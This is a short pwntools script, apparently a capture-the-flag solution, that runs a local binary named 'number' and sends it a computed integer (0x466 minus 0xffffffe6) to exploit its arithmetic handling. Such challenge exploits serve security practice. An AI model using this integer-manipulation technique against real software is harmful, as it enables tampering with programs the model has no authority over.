from pwn import *

p = process('./number')

# p.recv() # Catc
#p.sendline()

p.recv()

current = int("0xffffffe6", 0)
value = int("0x466", 0)
send = value - current

p.sendline(str(send))

print p.recv()
	
